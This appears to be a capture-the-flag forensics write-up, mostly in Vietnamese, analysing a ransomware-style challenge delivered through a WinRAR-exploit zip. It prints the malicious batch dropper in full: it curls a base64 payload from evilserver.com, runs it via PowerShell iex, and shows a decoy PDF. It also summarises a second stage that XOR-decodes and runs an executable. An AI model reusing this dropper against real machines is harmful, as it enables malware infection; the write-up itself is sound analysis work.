Chall : https://drive.google.com/file/d/1A6PQX4KitPRWyPzkN-8TVUZpShLzK2mD/view?usp=drive_link

Description: I received an email from an unidentified sender who described an intriguing world. Intrigued by their narrative, I followed the link in the email, downloaded a file, and attempted to open it. To my surprise, my essential documents were suddenly encrypted. I'm now in need of assistance to recover them.


----
Đề cho 1 file zip, chỉ cần mở ra nhìn đã dễ dàng nhận ra là con CVE winrar khá nổi gần đây :v, nhưng đã đổi thành zip extension. Mình sẽ vào folder bên trong và extract thẳng con bat file ra. Nội dung file bat:

```
@echo off
setlocal
set "ServerURL=http://evilserver.com:8080/useless.png"
for /f "delims=" %%i in ('curl -s -X GET "%ServerURL%"') do set response=%%i
powershell "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%response%')) | iex"
Pancham.pdf
endlocal
```

Nó sẽ tải xuống useless.png, decode ra và iex để thực thi, sau đó pop up pdf để đánh lừa.

Decode nội dung và ta có được 1 script powershell bị obfuscate:

![image](https://github.com/NVex0/uWU/assets/113530029/1cacee44-d0a4-4075-9885-7076907e464e)

Mình dùng `PSDecode` để deobfuscate:

![image](https://github.com/NVex0/uWU/assets/113530029/842a0cb0-af31-4775-b9d6-1cd997c9d25e)

Code này sẽ thực hiện tải xuống con panpan.exe, mở file `final report` làm key xor và xor với các bytes trong panpan.exe (từ bytes thứ 1024, size xor là 31488). Sau khi xor thì sẽ thực thi con exe đầu ra.

